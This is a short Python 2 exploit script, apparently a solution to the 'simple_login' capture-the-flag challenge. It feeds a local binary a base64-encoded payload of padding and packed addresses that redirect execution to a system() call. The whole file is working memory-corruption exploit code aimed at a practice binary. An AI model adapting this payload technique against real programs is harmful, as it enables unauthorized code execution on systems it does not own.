from subprocess import Popen, PIPE
from base64 import b64encode
import struct

p = Popen(['/home/raw/Documents/pwnable/rookis/simple_login/login'], stdout=PIPE, stdin=PIPE)

print p.stdout.read(15)

# create payload
after_decode = 0x811eb40
call_system = 0x08049284
payload = "A"*4
payload += struct.pack("<I", call_system)
payload += struct.pack("<I", after_decode)
payload = b64encode(payload)
p.stdin.write(payload + "\r\n")

data = ''
while not data:
	data =  p.stdout.readline()
	print data
